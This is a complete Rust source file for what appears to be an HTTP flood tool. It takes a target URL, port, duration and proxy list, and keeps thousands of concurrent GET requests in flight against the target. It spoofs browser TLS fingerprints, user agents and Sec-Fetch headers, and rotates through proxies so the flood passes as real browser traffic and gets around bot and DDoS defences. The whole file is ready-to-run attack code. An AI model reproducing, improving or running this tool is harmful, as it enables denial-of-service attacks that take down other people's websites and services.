use rand::rngs::StdRng;
use rand::seq::SliceRandom;
use rand::SeedableRng;
use std::env;
use std::fs;
use std::process;
use std::sync::atomic::{AtomicBool, AtomicU64, Ordering};
use std::sync::Arc;
use std::time::{Duration, Instant};
use wreq::{header, Client, Proxy, Version};
use wreq_util::Emulation;

const WORKERS: usize = 16;
const BATCH: usize = 512;
const CLIENT_COUNT: usize = 32;
const POOL_IDLE: usize = 4096;
const TIMEOUT: u64 = 5;

const EMU: &[Emulation] = &[
Emulation::Chrome136, Emulation::Chrome135, Emulation::Chrome131, Emulation::Chrome127,
Emulation::Firefox136, Emulation::Firefox135, Emulation::Firefox133,
Emulation::Safari18_3, Emulation::Safari18_2, Emulation::Safari18,
Emulation::Edge136, Emulation::Edge135, Emulation::Edge131,
Emulation::OkHttp5, Emulation::OkHttp3_9,
];

const UA_CH: &[&str] = &[
“Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36”,
“Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36”,
“Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36”,
];
const UA_FF: &[&str] = &[
“Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0”,
“Mozilla/5.0 (X11; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0”,
];
const UA_SF: &[&str] = &[
“Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.3 Safari/605.1.15”,
“Mozilla/5.0 (iPhone; CPU iPhone OS 18_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.3 Mobile/15E148 Safari/604.1”,
];
const UA_ED: &[&str] = &[
“Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0”,
];

const ACH: &str = “text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7”;
const AFF: &str = “text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8”;
const ASF: &str = “text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8”;

static OK: AtomicU64 = AtomicU64::new(0);
static FAIL: AtomicU64 = AtomicU64::new(0);
static H2: AtomicU64 = AtomicU64::new(0);

#[derive(Clone, Copy)]
enum Br { Ch, Ff, Sf, Ed, Ok }

fn classify(e: Emulation) -> Br {
let n = format!(”{:?}”, e);
if n.starts_with(“Chrome”) { Br::Ch }
else if n.starts_with(“Firefox”) { Br::Ff }
else if n.starts_with(“Safari”) { Br::Sf }
else if n.starts_with(“Edge”) { Br::Ed }
else { Br::Ok }
}

fn build(emu: Emulation, proxy: Option<&str>) -> Client {
let mut b = Client::builder()
.emulation(emu)
.timeout(Duration::from_secs(TIMEOUT))
.connect_timeout(Duration::from_secs(3))
.pool_max_idle_per_host(POOL_IDLE)
.pool_idle_timeout(Duration::from_secs(120))
.tcp_nodelay(true)
.cookie_store(true)
.redirect(wreq::redirect::Policy::none());

```
if let Some(p) = proxy {
    if let Result::Ok(px) = Proxy::all(p) {
        b = b.proxy(px);
    }
}

b.build().expect("client err")
```

}

fn make_url(base: &str, port: u16) -> String {
if (base.starts_with(“https://”) && port == 443) || (base.starts_with(“http://”) && port == 80) {
return base.to_string();
}
let se = base.find(”://”).map(|i| i + 3).unwrap_or(0);
let (scheme, rest) = (&base[..se], &base[se..]);
if let Some(sp) = rest.find(’/’) {
let h = rest[..sp].split(’:’).next().unwrap_or(&rest[..sp]);
format!(”{}{}:{}{}”, scheme, h, port, &rest[sp..])
} else {
let h = rest.split(’:’).next().unwrap_or(rest);
format!(”{}{}:{}”, scheme, h, port)
}
}

fn load_proxies(path: &str) -> Vec<String> {
let content = fs::read_to_string(path).unwrap_or_else(|_| {
eprintln!(“cannot read proxy file: {}”, path);
process::exit(1);
});
content.lines()
.map(|l| l.trim().to_string())
.filter(|l| !l.is_empty() && !l.starts_with(’#’))
.collect()
}

#[inline(always)]
async fn fire(client: &Client, url: &str, br: Br, i: usize) {
let res = match br {
Br::Ch | Br::Ed => {
let ua = if matches!(br, Br::Ed) { UA_ED[i % UA_ED.len()] } else { UA_CH[i % UA_CH.len()] };
client.get(url)
.header(header::CACHE_CONTROL, “max-age=0”)
.header(“Sec-Ch-Ua”, “"Chromium";v="136", "Not.A/Brand";v="99"”)
.header(“Sec-Ch-Ua-Mobile”, “?0”)
.header(“Sec-Ch-Ua-Platform”, “"Windows"”)
.header(“Sec-Fetch-Dest”, “document”)
.header(“Sec-Fetch-Mode”, “navigate”)
.header(“Sec-Fetch-Site”, “none”)
.header(“Sec-Fetch-User”, “?1”)
.header(“Upgrade-Insecure-Requests”, “1”)
.header(header::USER_AGENT, ua)
.header(header::ACCEPT, ACH)
.header(header::ACCEPT_ENCODING, “gzip, deflate, br”)
.header(header::ACCEPT_LANGUAGE, “en-US,en;q=0.9”)
.send().await
}
Br::Ff => {
client.get(url)
.header(header::USER_AGENT, UA_FF[i % UA_FF.len()])
.header(header::ACCEPT, AFF)
.header(header::ACCEPT_LANGUAGE, “en-US,en;q=0.5”)
.header(header::ACCEPT_ENCODING, “gzip, deflate, br, zstd”)
.header(“Upgrade-Insecure-Requests”, “1”)
.header(“Sec-Fetch-Dest”, “document”)
.header(“Sec-Fetch-Mode”, “navigate”)
.header(“Sec-Fetch-Site”, “none”)
.header(“Sec-Fetch-User”, “?1”)
.header(“Sec-GPC”, “1”)
.send().await
}
Br::Sf => {
client.get(url)
.header(header::USER_AGENT, UA_SF[i % UA_SF.len()])
.header(header::ACCEPT, ASF)
.header(header::ACCEPT_LANGUAGE, “en-US,en;q=0.9”)
.header(header::ACCEPT_ENCODING, “gzip, deflate, br”)
.send().await
}
Br::Ok => {
client.get(url)
.header(header::USER_AGENT, “okhttp/5.0.0”)
.header(header::ACCEPT, “*/*”)
.header(header::ACCEPT_ENCODING, “gzip, deflate, br”)
.send().await
}
};

```
match res {
    Result::Ok(resp) => {
        if matches!(resp.version(), Version::HTTP_2) {
            H2.fetch_add(1, Ordering::Relaxed);
        }
        drop(resp);
        OK.fetch_add(1, Ordering::Relaxed);
    }
    Err(_) => {
        FAIL.fetch_add(1, Ordering::Relaxed);
    }
}
```

}

async fn worker(pool: Arc<Vec<(Arc<Client>, Br)>>, url: Arc<str>, stop: Arc<AtomicBool>, base: usize) {
let mut idx = base;
while !stop.load(Ordering::Relaxed) {
let mut futs = Vec::with_capacity(BATCH);
for _ in 0..BATCH {
if stop.load(Ordering::Relaxed) { break; }
let (client, br) = &pool[idx % pool.len()];
let client = Arc::clone(client);
let br = *br;
let url = Arc::clone(&url);
let i = idx;
futs.push(tokio::spawn(async move {
fire(&client, &url, br, i).await;
}));
idx = idx.wrapping_add(1);
}
for f in futs {
let _ = f.await;
}
}
}

#[tokio::main(flavor = “multi_thread”)]
async fn main() {
let args: Vec<String> = env::args().collect();
if args.len() < 4 || args.len() > 5 {
eprintln!(“usage: ./rusttest <url> <port> <time> [proxies.txt]”);
eprintln!(“proxy format (one per line):”);
eprintln!(”  http://ip:port”);
eprintln!(”  http://user:pass@ip:port”);
eprintln!(”  socks5://ip:port”);
eprintln!(”  socks5://user:pass@ip:port”);
process::exit(1);
}

```
let port: u16 = args[2].parse().unwrap_or_else(|_| { eprintln!("bad port"); process::exit(1); });
let dur: u64 = args[3].parse().unwrap_or_else(|_| { eprintln!("bad time"); process::exit(1); });
let url: Arc<str> = make_url(&args[1], port).into();

let proxies: Vec<String> = if args.len() == 5 {
    load_proxies(&args[4])
} else {
    Vec::new()
};

let use_proxy = !proxies.is_empty();
let client_count = if use_proxy { proxies.len().max(CLIENT_COUNT) } else { CLIENT_COUNT };

if use_proxy {
    eprintln!("[*] loaded {} proxies", proxies.len());
}

eprintln!("[*] {} | {}s | workers: {} | batch: {} | clients: {} | in-flight: {}",
    url, dur, WORKERS, BATCH, client_count, WORKERS * BATCH);

let mut rng = StdRng::from_entropy();

let pool: Arc<Vec<(Arc<Client>, Br)>> = if use_proxy {
    // each proxy gets its own client with random browser profile
    Arc::new(proxies.iter().map(|p| {
        let e = *EMU.choose(&mut rng).unwrap();
        (Arc::new(build(e, Some(p.as_str()))), classify(e))
    }).collect())
} else {
    Arc::new((0..client_count).map(|_| {
        let e = *EMU.choose(&mut rng).unwrap();
        (Arc::new(build(e, None)), classify(e))
    }).collect())
};

let stop = Arc::new(AtomicBool::new(false));
let start = Instant::now();

let s = Arc::clone(&stop);
let timer = tokio::spawn(async move {
    tokio::time::sleep(Duration::from_secs(dur)).await;
    s.store(true, Ordering::Relaxed);
});

let s2 = Arc::clone(&stop);
let mon = tokio::spawn(async move {
    let mut last = 0u64;
    loop {
        tokio::time::sleep(Duration::from_secs(1)).await;
        if s2.load(Ordering::Relaxed) { break; }
        let ok = OK.load(Ordering::Relaxed);
        let fail = FAIL.load(Ordering::Relaxed);
        let total = ok + fail;
        let rps = total - last;
        last = total;
        eprintln!("[{:.0}s] rps: {} | ok: {} | fail: {} | h2: {}",
            start.elapsed().as_secs_f64(), rps, ok, fail, H2.load(Ordering::Relaxed));
    }
});

let mut handles = Vec::new();
for w in 0..WORKERS {
    let pool = Arc::clone(&pool);
    let url = Arc::clone(&url);
    let stop = Arc::clone(&stop);
    handles.push(tokio::spawn(worker(pool, url, stop, w * 10_000_000)));
}

for h in handles { let _ = h.await; }
let _ = timer.await;
stop.store(true, Ordering::Relaxed);
let _ = mon.await;

let elapsed = start.elapsed().as_secs_f64();
let ok = OK.load(Ordering::Relaxed);
let fail = FAIL.load(Ordering::Relaxed);
let total = ok + fail;
eprintln!("[done] {}s | total: {} | ok: {} | fail: {} | h2: {} | avg: {:.0} r/s",
    elapsed as u64, total, ok, fail, H2.load(Ordering::Relaxed),
    if elapsed > 0.0 { total as f64 / elapsed } else { 0.0 });
```

}